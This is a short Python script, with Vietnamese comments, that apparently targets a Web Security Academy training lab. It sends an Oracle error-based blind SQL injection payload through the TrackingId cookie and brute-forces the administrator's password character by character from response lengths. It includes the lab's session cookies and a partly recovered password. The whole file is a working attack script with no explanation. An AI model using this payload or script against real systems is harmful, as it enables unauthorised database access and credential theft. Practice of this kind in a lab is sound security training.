import requests

# URL của trang web
url = "https://0a03004104c874a083e3e25600d90033.web-security-academy.net/"

# Cookie mặc định
base_cookie = {
    "TrackingId": "9PHLGJqDkxQz2VOV",
    "session": "YRX7ClbISR6wVH4O3686tlFqZcLM2eWE",
}

# Hàm gửi request và lấy Content-Length
def get_content_length(char, position):
    # Tạo payload SQLi
    payload = (
        f"tf5G837DysFf6xnY' and (select case when ((select username from users where username='administrator' and substr(password, {position},1)='{char}')='administrator') then to_char(1/0) else 'a' end from dual)='a' -- "
    )

    # Gửi request
    cookie = base_cookie.copy()
    cookie["TrackingId"] = payload

    response = requests.get(url, cookies=cookie)

    # Trả về giá trị Content-Length
    return response.headers.get("Content-Length", "0")

# Tập hợp ký tự brute force
characters = "abcdefghijklmnopqrstuvwxyz0123456789"

# Độ dài mật khẩu dự đoán
password_length = 20
password = "hbkcbj06"

print("Brute-forcing password...")

# Lặp qua từng vị trí ký tự trong mật khẩu
for i in range(9, password_length + 1):
    for char in characters:
        # print(f"Testing character '{char}' at position {i}...")

        # Lấy Content-Length
        content_length = get_content_length(char, i)
        # print(content_length)

        # Kiểm tra nếu giá trị đúng (thay đổi tùy theo logic)
        if content_length == "735":  # Thay "EXPECTED_VALUE" bằng giá trị cụ thể từ request đúng
            password += char
            print(f"Found character: {char} at position {i}")
            break

print(f"Password: {password}")
